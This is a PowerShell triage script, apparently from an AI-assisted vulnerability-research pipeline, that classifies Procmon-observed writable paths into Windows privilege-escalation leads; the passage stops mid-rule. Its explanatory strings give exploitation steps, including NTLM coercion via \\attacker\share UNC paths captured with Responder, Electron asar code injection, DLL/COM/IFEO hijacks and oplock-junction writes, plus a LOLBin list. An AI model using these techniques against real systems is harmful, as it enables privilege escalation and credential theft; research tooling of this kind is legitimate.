param (
    [Parameter(Mandatory=$true)]
    [string]$JsonFeed,

    [switch]$Silent
)

# ═══════════════════════════════════════════════════════════════════════════════
#  Analyze-ExecutionLeads (rev 2)
#
#  Reads a writable_paths.json feed (from Parse-ProcmonWriteables rev 2) and
#  emits two queues:
#    high_confidence_leads.json    — heuristic matches, structured per primitive
#    cognitive_review_queue.json   — items that need agent semantic review
#
#  Threat model: standard local user (medium IL), no SeImpersonatePrivilege,
#  no admin group membership. Privileged consumer = High/System integrity, OR
#  a SYSTEM service impersonating the user (the latter is a separate threat
#  class — credential coercion, ACL-of-user, but the bug is still the bug).
#
#  Hardenings vs rev 1:
#   - Drops Paging-I/O attributions (LPE prompt §2 false-positive class).
#   - Drops self-trace contamination already filtered upstream.
#   - Drops "user-already-has-it" entries unless a privileged actor is involved
#     (LPE prompt §9 false-positive class).
#   - Down-weights leads where Open Reparse Point / Open Link is already set on
#     EVERY observed event (informative-but-not-disqualifying — kept in
#     cognitive queue with a hint).
#   - LOLBin matching is now extension-aware: powershell.exe touching ~/Downloads
#     no longer becomes a "LOLBin Proxy Target".
#   - Adds: COM Hijack (HKCU\Software\Classes\CLSID), Environment-variable
#     hijack (HKCU\Environment, including SilentCleanup-class windir/SystemRoot
#     hijack), App-Execution-Alias planting (%LOCALAPPDATA%\Microsoft\WindowsApps),
#     PowerShell-profile sinks, Electron .asar tamper, desktop.ini IconResource
#     coercion, Scheduled Task trigger XML, IFEO/AeDebug debugger hijack,
#     Service binary path hijack.
#   - Impersonation-aware text in SMB-coercion and registry-coercion verdicts.
#   - Severity boost when same path has both privileged Read AND Write events
#     (race opportunity).
# ═══════════════════════════════════════════════════════════════════════════════

$feedDir = Split-Path $JsonFeed
if ([string]::IsNullOrWhiteSpace($feedDir)) { $feedDir = ".\" }

Write-Host "[*] Initiating Advanced Execution Lead Analysis on: $JsonFeed" -ForegroundColor Cyan
Write-Host "    Mode: Low-Privilege Attacker Model (no SeImpersonatePrivilege assumed)" -ForegroundColor Gray

if (-not (Test-Path $JsonFeed)) {
    Write-Host "[-] JSON feed not found" -ForegroundColor Red
    exit
}

$rawData = Get-Content $JsonFeed -Raw | ConvertFrom-Json
if (-not $rawData) {
    Write-Host "[!] No data parsed from JSON." -ForegroundColor Yellow
    exit
}

# ═══════════════════════════════════════════════════════════════════════════════
# HELPERS
# ═══════════════════════════════════════════════════════════════════════════════

function Get-FieldValue {
    param($Obj, [string]$Name, $Default = "")
    if ($null -eq $Obj) { return $Default }
    if ($Obj.PSObject.Properties.Name -contains $Name) {
        $v = $Obj.$Name
        if ($null -eq $v) { return $Default }
        return $v
    }
    return $Default
}

# Parse SQOS impersonation level from Procmon Detail string.
function Get-SqosLevel {
    param([string]$Detail, [string]$Existing)
    if (-not [string]::IsNullOrWhiteSpace($Existing) -and $Existing -ne "NotSpecified") { return $Existing }
    if ([string]::IsNullOrWhiteSpace($Detail)) { return "NotSpecified" }
    if ($Detail -match '(?i)Impersonation(?:\s*Level)?:\s*(Impersonation|Delegation|Identification|Anonymous)') {
        return $matches[1]
    }
    return "NotSpecified"
}

function Get-OperationDirection {
    param([string]$Operation)
    $op = if ($Operation) { $Operation.Trim() } else { "" }
    $writeOps = @(
        "WriteFile","SetDispositionInformationFile","SetRenameInformationFile",
        "SetBasicInformationFile","SetEndOfFileInformationFile","SetAllocationInformationFile",
        "WriteConfig","RegSetValue","SetSecurityFile","RegCreateKey","RegDeleteKey","RegDeleteValue"
    )
    $readOps  = @(
        "CreateFile","ReadFile","QueryDirectory","QueryBasicInformationFile",
        "QueryStandardInformationFile","QueryNameInformationFile","Load Image",
        "QueryOpen","RegQueryValue","CreateFileMapping","RegOpenKey","RegEnumKey","RegEnumValue"
    )
    if ($writeOps -contains $op) { return "Write" }
    if ($readOps  -contains $op) { return "Read" }
    if ($op -match "(?i)(write|set|create|delete|rename)") { return "Write" }
    return "Read"
}

function Test-PrivilegedIntegrity {
    param([string]$Integrity)
    $i = if ($Integrity) { $Integrity.Trim().ToLower() } else { "unknown" }
    return ($i -eq "system" -or $i -eq "high" -or $i -eq "protected process")
}

# Returns the user/principal whose token actually hits the I/O. Critical for
# credential-coercion verdicts (LPE prompt §6).
function Get-EffectivePrincipal {
    param([string]$Integrity, [string]$Impersonating)
    if (-not [string]::IsNullOrWhiteSpace($Impersonating) -and $Impersonating -ne "Unknown") {
        return "Impersonating $Impersonating (NTLM hits the wire as the impersonated user)"
    }
    if ($Integrity -and $Integrity.ToLower() -eq "system") {
        return "Pure SYSTEM (MACHINE`$ NTLMv2 — uncrackable but relayable to LDAP/SMB)"
    }
    if ($Integrity) {
        return "Token: $Integrity"
    }
    return "Unknown principal"
}

# ═══════════════════════════════════════════════════════════════════════════════
# PATTERNS / KNOWN STRINGS
# ═══════════════════════════════════════════════════════════════════════════════

# LOLBin → file extensions that LOLBin natively executes/parses. Used to gate
# the LOLBin-proxy classifier so powershell.exe touching ~/Downloads/ doesn't
# trigger the rule.
$lolBinExtensions = @{
    "powershell.exe"   = @(".ps1", ".psm1", ".psd1", ".ps1xml")
    "pwsh.exe"         = @(".ps1", ".psm1", ".psd1", ".ps1xml")
    "cscript.exe"      = @(".vbs", ".vbe", ".js", ".jse", ".wsf", ".wsh")
    "wscript.exe"      = @(".vbs", ".vbe", ".js", ".jse", ".wsf", ".wsh")
    "mshta.exe"        = @(".hta", ".html", ".htm")
    "rundll32.exe"     = @(".dll", ".cpl", ".ocx")
    "regsvr32.exe"     = @(".dll", ".sct", ".ocx")
    "regasm.exe"       = @(".dll", ".exe")
    "regsvcs.exe"      = @(".dll")
    "installutil.exe"  = @(".exe", ".dll")
    "msbuild.exe"      = @(".csproj", ".vbproj", ".proj", ".targets", ".xml")
    "csc.exe"          = @(".cs", ".csproj")
    "certutil.exe"     = @(".cer", ".crt", ".pfx", ".p12", ".p7b")
    "wmic.exe"         = @(".xsl", ".mof", ".xml")
    "cmstp.exe"        = @(".inf", ".cmp")
    "control.exe"      = @(".cpl", ".dll")
    "schtasks.exe"     = @(".xml")
    "bitsadmin.exe"    = @(".exe", ".dll", ".bat", ".cmd")
    "mavinject.exe"    = @(".dll")
    "esentutl.exe"     = @(".db", ".edb", ".chk")
    "forfiles.exe"     = @(".bat", ".cmd")
    "bash.exe"         = @(".sh")
    "pcalua.exe"       = @(".exe", ".bat", ".cmd")
    "certreq.exe"      = @(".inf", ".cer")
    "wuauclt.exe"      = @()
    "netsh.exe"        = @(".dll")
    "vssadmin.exe"     = @()
    "bginfo.exe"       = @(".bgi")
    "cmd.exe"          = @(".bat", ".cmd")
}

$frameworkHosts = @(
    "w3wp.exe","svchost.exe","dotnet.exe","aspnet_compiler.exe",
    "mmc.exe","dllhost.exe","wmiprvse.exe","services.exe",
    "taskhost.exe","taskhostw.exe","spoolsv.exe","lsass.exe",
    "msiexec.exe","TrustedInstaller.exe"
)

$exploitableConfigPatterns = @(
    "machine\.config", "web\.config", "app\.config", "applicationHost\.config",
    "\.settings$", "devenv\.exe\.config", "mmc\.exe\.config",
    "assemblyBinding", "runtime"
)

# Components that index/scan filesystem broadly (Defender, Search). Their
# Read-only access to user-writable files is NOT, on its own, a privileged
# consumer of attacker-controlled data — they map the file to scan it.
# Used to demote LOLBin/SMB-coercion findings when these are the ONLY readers.
$benignReaders = @(
    "MsMpEng.exe","MpDefenderCoreService.exe","MsSense.exe","SenseCnCProxy.exe",
    "SearchProtocolHost.exe","SearchIndexer.exe","SearchFilterHost.exe",
    "MpUxAgent.exe","HealthService.exe","SgrmBroker.exe","WdFilter",
    "AppHostRegistrationVerifier.exe","CompatTelRunner.exe"
)

# ═══════════════════════════════════════════════════════════════════════════════
# RULE BODY
# ═══════════════════════════════════════════════════════════════════════════════

$hardcodedLeads = New-Object System.Collections.Generic.List[PSCustomObject]
$cognitiveQueue = New-Object System.Collections.Generic.List[PSCustomObject]

Write-Host "[*] Analyzing $($rawData.Count) verifiable paths via heuristic security engine..." -ForegroundColor Gray

$dropPagingIO       = 0
$dropOpenReparse    = 0
$dropOpenLink       = 0
$dropUserOnly       = 0
$dropBenignReaderOnly = 0

foreach ($entry in $rawData) {
    $path      = Get-FieldValue $entry "Path"
    $procs     = Get-FieldValue $entry "RelatedProcesses"
    $operations = Get-FieldValue $entry "Operations"
    $operation = Get-FieldValue $entry "Operation"
    $result    = Get-FieldValue $entry "Result"
    $detail    = Get-FieldValue $entry "Detail"
    $integrity = Get-FieldValue $entry "Integrity" "Unknown"
    $impersonating = Get-FieldValue $entry "Impersonating" "Unknown"
    $isPaging  = [bool](Get-FieldValue $entry "IsPagingIO" $false)
    $openRP    = [bool](Get-FieldValue $entry "OpenReparsePoint" $false)
    $openLink  = [bool](Get-FieldValue $entry "OpenLink" $false)
    $isKernelAttrib = [bool](Get-FieldValue $entry "IsKernelAttribution" $false)
    $anyWrite  = [bool](Get-FieldValue $entry "AnyWrite" $false)
    $anyRead   = [bool](Get-FieldValue $entry "AnyRead"  $false)
    $anyPrivWrite  = [bool](Get-FieldValue $entry "AnyPrivWrite" $false)
    $anyPrivRead   = [bool](Get-FieldValue $entry "AnyPrivRead"  $false)
    $anyImpersonating = [bool](Get-FieldValue $entry "AnyImpersonating" $false)
    $anyOpenRP        = [bool](Get-FieldValue $entry "AnyOpenReparsePoint" $false)
    $anyOpenLink      = [bool](Get-FieldValue $entry "AnyOpenLink" $false)
    $isUserOnly       = [bool](Get-FieldValue $entry "IsUserOnlyConsumer" $false)
    $sqosFromFeed     = Get-FieldValue $entry "SqosLevel" "NotSpecified"

    $isDirectLead     = $false
    $severity         = "Low"
    $type             = "Unknown"
    $reason           = ""
    $exploitPrimitive = ""

    $opDirection   = Get-OperationDirection -Operation $operation
    $sqos          = Get-SqosLevel -Detail $detail -Existing $sqosFromFeed
    $isPrivileged  = Test-PrivilegedIntegrity -Integrity $integrity
    $isPrivilegedAny = $isPrivileged -or $anyPrivRead -or $anyPrivWrite
    $isNameNotFound = ($result -match "(?i)NAME NOT FOUND")
    $effectivePrincipal = Get-EffectivePrincipal -Integrity $integrity -Impersonating $impersonating

    # ─────────────────────────────────────────────────────────────────────────
    # FALSE-POSITIVE FILTERS (LPE prompt § 2 / § 9)
    # ─────────────────────────────────────────────────────────────────────────

    # LPE §2: Paging-I/O attribution is Cache Manager dirty-page flush — the
    # process column is whatever thread the Memory Manager scheduled, NOT the
    # actual writer. Drop for write-primitive analysis. Surface in cognitive
    # queue for awareness.
    if ($isPaging -or $isKernelAttrib) {
        $dropPagingIO++
        $cognitiveQueue.Add([PSCustomObject]@{
            Path = $path
            Processes = $procs
            Hint = "[FILTERED — Paging-I/O / kernel attribution] LPE prompt §2: process attribution unreliable for Paging-I/O / Cache-Manager flushes. Re-derive truth from a fresh local trace before treating this as a privileged-write primitive."
            TraceFile = (Get-FieldValue $entry "TraceFile")
            Timestamp = (Get-FieldValue $entry "Timestamp")
            Operation = $operation
            Result = $result
            Detail = $detail
            Integrity = $integrity
            Impersonating = $impersonating
            OperationDirection = $opDirection
            SqosLevel = $sqos
            FilterReason = "PagingIO_or_KernelAttribution"
        })
        continue
    }

    # LPE §9: "user-already-has-it" — the only consumer is the current user's
    # own session and no privileged actor touches the path. The redirect
    # cannot reach anywhere the user couldn't reach already.
    if ($isUserOnly -and (-not $isPrivilegedAny) -and (-not $anyImpersonating)) {
        $dropUserOnly++
        # Don't even add to cognitive queue — pure noise.
        continue
    }

    # When EVERY observed event already had Open Reparse Point set, the
    # consumer is correctly using FILE_FLAG_OPEN_REPARSE_POINT. Demote to the
    # cognitive queue with a hint so an analyst can still scan the surrounding
    # code path (LPE §2: another open of the same path elsewhere may still be
    # missing the flag).
    if ($anyOpenRP -and -not $anyWrite) {
        $dropOpenReparse++
        $cognitiveQueue.Add([PSCustomObject]@{
            Path = $path
            Processes = $procs
            Hint = "[DEMOTED — Open Reparse Point present on every observed open] LPE §2: this is informative not disqualifying. Look for OTHER opens of the same path (different code paths, TOCTOU races) that may be missing the flag. Worth a focused look only if the consumer is high-value."
            TraceFile = (Get-FieldValue $entry "TraceFile")
            Timestamp = (Get-FieldValue $entry "Timestamp")
            Operation = $operation
            Result = $result
            Detail = $detail
            Integrity = $integrity
            Impersonating = $impersonating
            OperationDirection = $opDirection
            SqosLevel = $sqos
            FilterReason = "OpenReparsePoint_AlwaysSet"
        })
        continue
    }
    # Same logic for registry: every observed open had REG_OPTION_OPEN_LINK.
    if ($anyOpenLink -and ($path -match "^HK")) {
        $dropOpenLink++
        $cognitiveQueue.Add([PSCustomObject]@{
            Path = $path
            Processes = $procs
            Hint = "[DEMOTED — REG_OPTION_OPEN_LINK present on every observed open] LPE §4.1: this consumer is opening the link key itself. Lead remains live ONLY if you find a separate open of the same key elsewhere that omits the flag."
            TraceFile = (Get-FieldValue $entry "TraceFile")
            Timestamp = (Get-FieldValue $entry "Timestamp")
            Operation = $operation
            Result = $result
            Detail = $detail
            Integrity = $integrity
            Impersonating = $impersonating
            OperationDirection = $opDirection
            SqosLevel = $sqos
            FilterReason = "OpenLink_AlwaysSet"
        })
        continue
    }

    # If the only observed actors are benign-reader processes (Defender / Search
    # indexers) and they only Read, the lead is mostly "MsMpEng scanned the
    # file" — not a privileged consumption of attacker-controlled bytes.
    $procList = ($procs -split ',' | ForEach-Object { $_.Trim() } | Where-Object { $_ })
    $allBenign = $true
    foreach ($p in $procList) {
        if (-not ($benignReaders -contains $p)) { $allBenign = $false; break }
    }
    if ($allBenign -and (-not $anyPrivWrite) -and ($procList.Count -gt 0)) {
        $dropBenignReaderOnly++
        $cognitiveQueue.Add([PSCustomObject]@{
            Path = $path
            Processes = $procs
            Hint = "[DEMOTED — only benign indexer/scanner readers observed (Defender/Search)] These map files to scan, not to load/execute attacker bytes. Only relevant if a SECOND, non-indexer privileged process consumes the same file."
            TraceFile = (Get-FieldValue $entry "TraceFile")
            Timestamp = (Get-FieldValue $entry "Timestamp")
            Operation = $operation
            Result = $result
            Detail = $detail
            Integrity = $integrity
            Impersonating = $impersonating
            OperationDirection = $opDirection
            SqosLevel = $sqos
            FilterReason = "BenignReaderOnly"
        })
        continue
    }

    # ─────────────────────────────────────────────────────────────────────────
    # RULE 1: Named Pipe Hijacking (literal pipe paths)
    # ─────────────────────────────────────────────────────────────────────────
    if ($path -match "^\\\\\.\\pipe\\") {
        $severity = "Critical"
        $type = "Named Pipe Hijacking / Impersonation"
        $exploitPrimitive = "Pipe_Hijack"
        $reason = "Direct named-pipe endpoint at a writable location. A medium-IL attacker can plant a pipe server here and capture connecting clients."
        if ($isPrivileged) {
            $reason += " PRIVILEGED CLIENT ($integrity) connects → token material available."
        }
        if ($sqos -in @("NotSpecified","Impersonation","Delegation")) {
            $reason += " SQOS=$sqos → impersonation-safe for service accounts; SMB relay viable for standard users."
        } elseif ($sqos -eq "Identification") {
            $severity = "High"
            $reason += " SQOS=Identification → token query only, no impersonation. Still useful for SMB relay."
        }
        $isDirectLead = $true
    }

    # ─────────────────────────────────────────────────────────────────────────
    # RULE 1.5: AppExecLink Squatting (HIGH VALUE — explicit in the
    # Security_Research_Addendum §2 for this project)
    # ─────────────────────────────────────────────────────────────────────────
    if (-not $isDirectLead -and $path -match "(?i)\\AppData\\Local\\Microsoft\\WindowsApps\\") {
        $severity = "High"
        $type = "App Execution Alias Squatting"
        $exploitPrimitive = "AppExecAlias_Plant"
        $reason = "Path lives under %LOCALAPPDATA%\\Microsoft\\WindowsApps — an App Execution Alias folder that is on the user's PATH. Dropping a binary here that shadows an unqualified command ('notepad', 'wt', 'winget', 'bash', etc.) hijacks subsequent invocations. ACL anomaly note: Microsoft default is TrustedInstaller-owned with conditional WIN://SYSAPPID ACEs; a user-FullControl ACE here is non-default and is itself worth flagging."
        if ($isPrivileged) {
            $reason += " A privileged consumer ($integrity) was observed touching this folder — chain potentially elevates beyond user-scope squatting."
        }
        $isDirectLead = $true
    }

    # ─────────────────────────────────────────────────────────────────────────
    # RULE 1.6: PowerShell profile sinks (auto-loaded on every shell start)
    # ─────────────────────────────────────────────────────────────────────────
    if (-not $isDirectLead -and $path -match "(?i)\\(Documents\\(WindowsPowerShell|PowerShell)\\(Microsoft\.)?(PowerShell_)?profile\.ps1|Documents\\PowerShell\\Modules\\.+\.psm1)$") {
        $severity = "High"
        $type = "PowerShell Profile Auto-Load Sink"
        $exploitPrimitive = "PowerShell_Profile"
        $reason = "Writable PowerShell profile / auto-loaded module. Every interactive PS session sources this on launch. Drop 'Invoke-Expression'/payload here for execution at the integrity level of whatever account opens PowerShell next (including admin-RunAs, scheduled tasks, or DSC pulls)."
        $isDirectLead = $true
    }

    # ─────────────────────────────────────────────────────────────────────────
    # RULE 1.7: Electron app.asar tamper surface
    # ─────────────────────────────────────────────────────────────────────────
    if (-not $isDirectLead -and $path -match "(?i)\\resources\\app\.asar(\.unpacked)?(\\|$)") {
        $severity = "High"
        $type = "Electron app.asar Tamper"
        $exploitPrimitive = "Electron_AsarTamper"
        $reason = "User-writable Electron 'app.asar' archive. Even when the EXE is AuthentiCode-signed, Electron's signature DOES NOT cover the '.asar' payload. Unpack/repack with '@electron/asar' to inject 'require('child_process').exec(...)' for in-process RCE at the Electron host's integrity. Verify 'EnableEmbeddedAsarIntegrityValidation' fuse with 'npx @electron/fuses read --app <exe>'; if OFF, plain extract-repack works (CVE-2024-46992 / CVE-2025-55305 cover the on-fuse cases)."
        $isDirectLead = $true
    }

    # ─────────────────────────────────────────────────────────────────────────
    # RULE 1.8: Service Binary Path / IFEO debugger surface (HKLM is normally
    # admin-only; appearing as user-writable signals an ACL anomaly worth a
    # critical-severity flag)
    # ─────────────────────────────────────────────────────────────────────────
    if (-not $isDirectLead -and $path -match "(?i)^HKLM\\SYSTEM\\CurrentControlSet\\Services\\.+\\(ImagePath|ServiceDll)$") {
        $severity = "Critical"
        $type = "Service Binary Path Hijack (ACL anomaly)"
        $exploitPrimitive = "Service_BinaryPath"
        $reason = "Service ImagePath/ServiceDll under HKLM appearing in the user-writable feed indicates a non-default ACL — direct LPE primitive: rewrite the value, restart the service, run as the service account."
        $isDirectLead = $true
    }
    if (-not $isDirectLead -and $path -match "(?i)^HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\.+\\(Debugger|GlobalFlag)$") {
        $severity = "Critical"
        $type = "IFEO Debugger Hijack (ACL anomaly)"
        $exploitPrimitive = "IFEO_Debugger"
        $reason = "Image File Execution Options Debugger value writable to the user. Plant your binary here; whenever the targeted EXE is launched, the OS spawns YOUR debugger as the parent — direct execution at the launching principal."
        $isDirectLead = $true
    }
    if (-not $isDirectLead -and $path -match "(?i)^HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AeDebug\\Debugger$") {
        $severity = "Critical"
        $type = "AeDebug Postmortem Debugger Hijack"
        $exploitPrimitive = "AeDebug"
        $reason = "AeDebug Debugger value writable. Any crashing process triggers your binary as the postmortem handler — runs at the crashing process's integrity (often SYSTEM for service crashes)."
        $isDirectLead = $true
    }

    # ─────────────────────────────────────────────────────────────────────────
    # RULE 1.9: COM Hijack via HKCU\Software\Classes\CLSID
    # ─────────────────────────────────────────────────────────────────────────
    if (-not $isDirectLead -and $path -match "(?i)^(HKCU|HKEY_CURRENT_USER|HKU\\[^\\]+)\\Software\\Classes\\(CLSID|Wow6432Node\\CLSID|Interface)\\\{[0-9a-fA-F-]+\}") {
        $severity = "High"
        $type = "Per-User COM Hijack"
        $exploitPrimitive = "COM_Hijack_HKCU"
        $reason = "Per-user CLSID/Interface registration. Resolved BEFORE HKLM by COM activation when the resolver runs in the user's hive. If a SYSTEM service activates this CLSID while impersonating the user, planting 'InprocServer32' / 'LocalServer32' here hijacks the activation."
        if ($anyImpersonating) {
            $severity = "Critical"
            $reason += " Trace shows an impersonating actor opening this key — direct COM-hijack chain candidate."
        }
        $isDirectLead = $true
    }

    # ─────────────────────────────────────────────────────────────────────────
    # RULE 1.10: HKCU\Environment hijack (SilentCleanup-class UAC bypass family)
    # ─────────────────────────────────────────────────────────────────────────
    if (-not $isDirectLead -and $path -match "(?i)^(HKCU|HKEY_CURRENT_USER|HKU\\[^\\]+)\\Environment(\\|$)") {
        $severity = "High"
        $type = "Environment Variable Hijack (UAC-bypass adjacent)"
        $exploitPrimitive = "Env_Hijack_HKCU"
        $valHint = ""
        if ($path -match "(?i)\\(windir|systemroot|path|psmodulepath|temp|tmp)$") {
            $valHint = " VALUE NAME = `$($matches[1])` — high-impact (SilentCleanup 'windir' hijack, PSModulePath module-load hijack, Path/PATH PE-load shadowing)."
            $severity = "Critical"
        }
        $reason = "HKCU\\Environment is consumed by 'ExpandEnvironmentStringsForUser' and the user's logon path resolution.${valHint} A privileged auto-elevation task (e.g. SilentCleanup, fodhelper, computerdefaults) that fails to enforce per-user environment isolation will resolve a hijacked variable while running High/SYSTEM."
        $isDirectLead = $true
    }

    # ─────────────────────────────────────────────────────────────────────────
    # RULE 2: Binary Planting / DLL Hijacking
    # ─────────────────────────────────────────────────────────────────────────
    if (-not $isDirectLead -and $path -match "\.(exe|dll|sys|cpl|ocx|efi|scr|msi|msp|msc|com|hta|jar|xll|wll|xla|drv|tlb|node)$") {
        if ($path -match "(System32|SysWOW64|Program Files|ProgramData\\[^\\]+\\|\\Windows\\)") {
            $severity = "Critical"
            $type = "Binary Planting (High-Priv Dir)"
            $exploitPrimitive = "Binary_Plant_HighPriv"
            $reason = "Writable executable under a privileged directory. If loaded by a SYSTEM/High process, attacker gets code execution at that integrity with zero special privileges."
        } else {
            $severity = "High"
            $type = "Binary Planting (User Space)"
            $exploitPrimitive = "Binary_Plant_UserSpace"
            $reason = "Writable executable. Prone to DLL search-order hijacking or direct execution. No privileges required to replace; impact depends on what principal next executes it."
        }
        if ($isPrivileged) {
            $reason += " LOADED BY PRIVILEGED PROCESS ($integrity) → direct code execution at that integrity."
        }
        $isDirectLead = $true
    }

    # ─────────────────────────────────────────────────────────────────────────
    # RULE 2.1: SxS / DotLocal Manifest Hijacking
    # ─────────────────────────────────────────────────────────────────────────
    if (-not $isDirectLead -and $path -match "\.(manifest|local)$") {
        $severity = "Critical"
        $type = "SxS / DotLocal Manifest Poisoning"
        $exploitPrimitive = "SxS_DotLocal"
        $reason = "Dropping a '.local' directory or '.manifest' file hijacks DLL load order for legitimate applications. No privileges needed."
        $isDirectLead = $true
    }

    # ─────────────────────────────────────────────────────────────────────────
    # RULE 2.2: Package / Dependency Hijacking
    # ─────────────────────────────────────────────────────────────────────────
    if (-not $isDirectLead -and $path -match "(node_modules|site-packages|vendor\\|gems\\|\\.cargo\\registry)") {
        $severity = "Critical"
        $type = "Dependency / Package Subversion"
        $exploitPrimitive = "Dependency_Hijack"
        $reason = "Writable dependency folder. Any library requested by the application can be transparently replaced. No privileges needed."
        $isDirectLead = $true
    }

    # ─────────────────────────────────────────────────────────────────────────
    # RULE 2.3: Web Shell / Webroot Planting
    # ─────────────────────────────────────────────────────────────────────────
    if (-not $isDirectLead -and $path -match "(inetpub\\wwwroot|xampp\\htdocs|tomcat\\webapps|nginx\\html)" -and $path -match "\.(aspx|php|jsp|asmx|html|ashx|asp)$") {
        $severity = "Critical"
        $type = "Web Shell Proxy / Server Planting"
        $exploitPrimitive = "WebShell_Plant"
        $reason = "Writing scripts into a webroot creates a web shell. No privileges needed if the directory is writable."
        $isDirectLead = $true
    }

    # ─────────────────────────────────────────────────────────────────────────
    # RULE 2.4: LNK Shortcut Poisoning + URL/Theme/PIF coercion
    # ─────────────────────────────────────────────────────────────────────────
    if (-not $isDirectLead -and $path -match "\.lnk$") {
        $severity = "High"
        $type = "LNK Shortcut Hijacking"
        $exploitPrimitive = "LNK_Hijack"
        $reason = "Writable .lnk shortcut. Modify target to redirect execution; or set Icon to UNC for NTLM coercion (CVE-2025-50154 family). No privileges needed."
        $isDirectLead = $true
    }
    if (-not $isDirectLead -and $path -match "\.url$") {
        $severity = "High"
        $type = ".URL Internet Shortcut NTLM Coercion"
        $exploitPrimitive = "URL_NTLM_Coerce"
        $reason = "Writable '.url' Internet shortcut. CVE-2024-43451 family — 'IconFile=\\\\attacker\\share\\icon.ico' triggers NTLMv2 from any user who interacts with the shortcut (single click, right-click, drag-move). Capture with Responder; relay or crack."
        $isDirectLead = $true
    }
    if (-not $isDirectLead -and $path -match "\.(theme|themepack|deskthemepack)$") {
        $severity = "High"
        $type = "Theme NTLM Coercion (CVE-2024-21320 family)"
        $exploitPrimitive = "Theme_NTLM_Coerce"
        $reason = "Writable theme file. UNC-pointed 'Wallpaper=' or 'BrandImage=' coerces NTLM auth on theme load. Patched by MSRC; verify mitigation status."
        $isDirectLead = $true
    }

    # ─────────────────────────────────────────────────────────────────────────
    # RULE 2.5: desktop.ini IconResource SMB coercion (Section 8 of addendum)
    # ─────────────────────────────────────────────────────────────────────────
    if (-not $isDirectLead -and $path -match "(?i)\\desktop\.ini$") {
        $severity = "Medium"
        $type = "desktop.ini IconResource Coercion"
        $exploitPrimitive = "DesktopIni_Coerce"
        $reason = "Writable desktop.ini. `[. ShellClassInfo] IconResource=\\\\attacker\\share\\icon.ico` coerces an SMB handshake from any interactive user who renders the parent folder in Explorer. Severity is environment-dependent: HIGH on domain / hybrid-AAD hosts (NTLMv2 captured/relayed), LOW on AAD-only single-account hosts."
        $isDirectLead = $true
    }

    # ─────────────────────────────────────────────────────────────────────────
    # RULE 3: AutoRun / Script Persistence
    # ─────────────────────────────────────────────────────────────────────────
    if (-not $isDirectLead -and ($path -match "\.(bat|ps1|psm1|psd1|vbs|vbe|cmd|wsf|js|jse|wsh)$" -or $path -match "(Startup|\\Run\\|\\RunOnce\\|\\Services\\|Tasks\\|wbem\\mof|scripts\\Startup|scripts\\Logon|scripts\\Shutdown|scripts\\Logoff)")) {
        $severity = "High"
        $type = "AutoRun / Script Persistence"
        $exploitPrimitive = "AutoRun_Persistence"
        $reason = "Writable script file or persistence location. Likely executed on boot/logon. No privileges needed to modify."
        $isDirectLead = $true
    }

    # ─────────────────────────────────────────────────────────────────────────
    # RULE 4: Scheduled Task XML
    # ─────────────────────────────────────────────────────────────────────────
    if (-not $isDirectLead -and $path -match "(?i)\\System32\\Tasks\\.+$|\\schedule\\taskcache\\tree\\") {
        $severity = "Critical"
        $type = "Scheduled Task Definition Hijack (ACL anomaly)"
        $exploitPrimitive = "ScheduledTask_Plant"
        $reason = "Scheduled-task definition under '\\System32\\Tasks\\' appearing in the user-writable feed is an ACL anomaly. Default ACL is Admins/SYSTEM only. Rewriting the XML's '<Command>' lets you piggy-back on the trigger and run as whichever principal the task is configured to run as."
        $isDirectLead = $true
    }

    # ─────────────────────────────────────────────────────────────────────────
    # RULE 5: SMB / NTLM Coercion via Path Redirection (LPE prompt §3.5)
    # ─────────────────────────────────────────────────────────────────────────
    if (-not $isDirectLead -and $isPrivileged -and $opDirection -eq "Read") {
        $severity = "Critical"
        $type = "SMB / NTLM Coercion Candidate"
        $exploitPrimitive = "SMB_Coercion"
        $reason = "PRIVILEGED PROCESS ($integrity) reads from a user-writable path. Plant NTFS junction → drive-letter → \\\\attacker\\share via the medium-IL chain (LPE prompt §3.5: DefineDosDevice + mklink /j) to capture/relay Net-NTLMv2. Effective principal: $effectivePrincipal."
        if ($isNameNotFound) {
            $reason += " PATH DOES NOT EXIST → trivial to plant junction without race."
        }
        if ($anyOpenRP) {
            $reason += " (Caveat: at least one observed open had Open Reparse Point set — look for OTHER opens missing the flag.)"
            $severity = "High"
        }
        $isDirectLead = $true
    }

    # ─────────────────────────────────────────────────────────────────────────
    # RULE 6: Arbitrary Write via Oplock + Junction (LPE prompt §3.5 + §3.7)
    # ─────────────────────────────────────────────────────────────────────────
    if (-not $isDirectLead -and ($isPrivileged -and $opDirection -eq "Write" -or $anyPrivWrite)) {
        $severity = "Critical"
        $type = "Arbitrary Write via Oplock+Junction"
        $exploitPrimitive = "Oplock_ArbitraryWrite"
        $reason = "PRIVILEGED PROCESS ($integrity) WRITES to a user-writable path. Set exclusive oplock on directory → swap NTFS junction mid-write → write lands in arbitrary privileged location (System32, drivers folder, Tasks XML). NO SPECIAL PRIVILEGES REQUIRED. Effective principal: $effectivePrincipal."
        if ($path -match "\.(tmp|log|cache|dat|bak|old|etl|wer)$") {
            $reason += " Temp/cache/log file pattern → high likelihood of repeated writes (reliable trigger)."
        }
        if ($anyPrivRead -and $anyPrivWrite) {
            $reason += " BOTH privileged READ and WRITE observed → strong race-window opportunity (TOCTOU between check and consume)."
        }
        $isDirectLead = $true
    }

    # ─────────────────────────────────────────────────────────────────────────
    # RULE 7: Pipe Planting via Path Redirection
    # ─────────────────────────────────────────────────────────────────────────
    if (-not $isDirectLead -and $isPrivileged -and $isNameNotFound -and
        ($path -notmatch "^\\\\\.\\pipe\\") -and ($path -match "^[a-zA-Z]:\\")) {
        $severity = "High"
        $type = "Pipe Planting via Path Redirection"
        $exploitPrimitive = "Pipe_Plant_Redirect"
        $reason = "PRIVILEGED PROCESS ($integrity) attempts to open a NON-EXISTENT file path. Plant symlink to named pipe → capture connecting client for NTLM relay. No special privileges needed for relay path."
        if ($sqos -in @("NotSpecified","Impersonation","Delegation")) {
            $severity = "Critical"
            $reason += " SQOS=$sqos → default allows impersonation-level access. SMB relay AND token capture both viable."
        } elseif ($sqos -eq "Identification") {
            $reason += " SQOS=Identification → impersonation blocked, but SMB relay still works."
        } elseif ($sqos -eq "Anonymous") {
            $severity = "Medium"
            $reason += " SQOS=Anonymous → DoS / timing side-channel only."
        }
        $isDirectLead = $true
    }

    # ─────────────────────────────────────────────────────────────────────────
    # RULE 8: Config Poisoning — Structured Detection
    # ─────────────────────────────────────────────────────────────────────────
    if (-not $isDirectLead -and $path -match "\.(config|xml|json|yml|yaml)$") {
        $isFrameworkHost = $false
